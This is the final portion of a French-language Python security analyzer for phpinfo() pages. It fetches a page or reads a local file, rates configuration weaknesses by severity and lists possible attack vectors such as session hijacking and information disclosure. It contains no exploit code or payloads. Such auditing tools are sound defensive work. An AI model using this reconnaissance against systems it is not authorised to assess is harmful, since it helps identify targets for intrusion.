                "type": "Session Hijacking",
                "description": "Vol de session via XSS ou interception",
                "exploitation": "Cookie de session non protégé (httponly/secure)",
                "impact": "Usurpation d'identité utilisateur"
            })
        
        # Check for information disclosure
        if self.info_disclosure:
            vectors.append({
                "type": "Information Disclosure",
                "description": "Reconnaissance facilitée pour attaques ciblées",
                "exploitation": "phpinfo() expose configuration complète",
                "impact": "Identification de failles spécifiques"
            })
        
        return vectors
    
    def print_summary(self, report, output_file):
        """Print colored summary to console"""
        print("\n" + "="*70)
        print(critical("  RAPPORT D'ANALYSE DE SÉCURITÉ PHPINFO()  "))
        print("="*70 + "\n")
        
        # Summary
        summary = report['summary']
        print(info("📊 RÉSUMÉ:"))
        print(f"  • Total vulnérabilités: {summary['total_vulnerabilities']}")
        print(critical(f"  • Critiques: {summary['critical']}"))
        print(fail(f"  • Élevées: {summary['high']}"))
        print(warning(f"  • Moyennes: {summary['medium']}"))
        print(f"  • Faibles: {summary['low']}")
        print(success(f"  • Points positifs: {summary['positive_points']}\n"))
        
        # Critical vulnerabilities
        critical_vulns = [v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']
        if critical_vulns:
            print(critical("\n🚨 VULNÉRABILITÉS CRITIQUES:"))
            for v in critical_vulns:
                print(critical(f"\n  ⚠ {v['issue']}"))
                print(f"    Risque: {v['risk']}")
                if 'recommendation' in v:
                    print(f"    Recommandation: {v['recommendation']}")
        
        # Attack vectors
        if report['attack_vectors']:
            print(fail("\n\n🎯 VECTEURS D'ATTAQUE IDENTIFIÉS:"))
            for vector in report['attack_vectors']:
                print(fail(f"\n  • {vector['type']}"))
                print(f"    Description: {vector['description']}")
                print(f"    Impact: {vector['impact']}")
        
        # Positive points
        if self.positive_points:
            print(success("\n\n✅ POINTS POSITIFS:"))
            for point in self.positive_points[:10]:
                print(success(f"  • {point}"))
        
        print("\n" + "="*70)
        print(info(f"Rapport détaillé sauvegardé dans: {output_file}"))
        print("="*70 + "\n")

def main():
    parser = argparse.ArgumentParser(
        description='PHPInfo Security Analyzer - Analyse les vulnérabilités',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemples d'utilisation:
  Analyser une URL:
    %(prog)s --url http://target.com/phpinfo.php --output rapport.json
    
  Analyser un fichier HTML local:
    %(prog)s --input phpinfo.html --output rapport.json -v
    
  Mode verbeux pour explications détaillées:
    %(prog)s -u http://target.com/phpinfo.php -o rapport.json -v
        """
    )
    
    # Groupe mutuellement exclusif pour URL ou fichier d'entrée
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument('--url', '-u', 
                       dest="url",
                       help="URL de la page phpinfo()")
    input_group.add_argument('--input', '-i',
                       dest="input_file",
                       help="Fichier HTML local contenant phpinfo()")
    
    parser.add_argument('--output', '-o',
                       dest="output",
                       help="Fichier de sortie JSON (défaut: phpinfo_report.json)",
                       default="phpinfo_report.json")
    parser.add_argument('--verbose', '-v',
                       action="store_true",
                       dest="verbose",
                       help="Mode verbeux avec explications détaillées")
    
    args = parser.parse_args()
    
    analyzer = PHPInfoAnalyzer(verbose=args.verbose)
    
    # Récupération du contenu source
    if args.url:
        print(info("[+] Téléchargement de la page phpinfo()..."))
        source_code = analyzer.get_content(args.url)
        
        if not source_code:
            print(fail("[✗] Impossible de récupérer la page"))
            sys.exit(1)
    else:
        print(info(f"[+] Lecture du fichier local: {args.input_file}"))
        try:
            with open(args.input_file, 'r', encoding='utf-8') as f:
                source_code = f.read()
            print(success("[✓] Fichier chargé avec succès"))
        except FileNotFoundError:
            print(fail(f"[✗] Fichier introuvable: {args.input_file}"))
            sys.exit(1)
        except UnicodeDecodeError:
            print(warning("[!] Encodage UTF-8 échoué, essai avec latin-1..."))
            try:
                with open(args.input_file, 'r', encoding='latin-1') as f:
                    source_code = f.read()
                print(success("[✓] Fichier chargé avec succès (latin-1)"))
            except Exception as e:
                print(fail(f"[✗] Erreur de lecture du fichier: {str(e)}"))
                sys.exit(1)
        except Exception as e:
            print(fail(f"[✗] Erreur lors de la lecture: {str(e)}"))
            sys.exit(1)
    
    print(info("[+] Extraction des données PHP..."))
    data = analyzer.extract_php_info(source_code)
    
    if not data:
        sys.exit(1)
    
    if args.verbose:
        print(info("\n" + "="*70))
        print(info("  DÉMARRAGE DE L'ANALYSE APPROFONDIE"))
        print(info("="*70))
    
    print(info("[+] Analyse de sécurité en cours...\n"))
    
    # Run all security checks
    if 'php_version' in data:
        analyzer.check_php_version(data['php_version'])
    
    if args.verbose:
        print(info("\n" + "-"*70))
    analyzer.analyze_directives(data)
    
    if args.verbose:
        print(info("\n" + "-"*70))
    analyzer.check_dangerous_functions(data)
    
    if args.verbose:
        print(info("\n" + "-"*70))
    analyzer.check_extensions(data)
    
    if args.verbose:
        print(info("\n" + "-"*70))
    analyzer.check_paths_disclosure(data)
    
    # Generate report
    print(info("\n[+] Génération du rapport..."))
    analyzer.generate_report(args.output)
    
    print(success("\n[✓] Analyse terminée!"))
    print(info(f"[i] Source: {'URL: ' + args.url if args.url else 'Fichier: ' + args.input_file}"))
    print(info(f"[i] Rapport sauvegardé: {args.output}"))

if __name__ == "__main__":
    main()
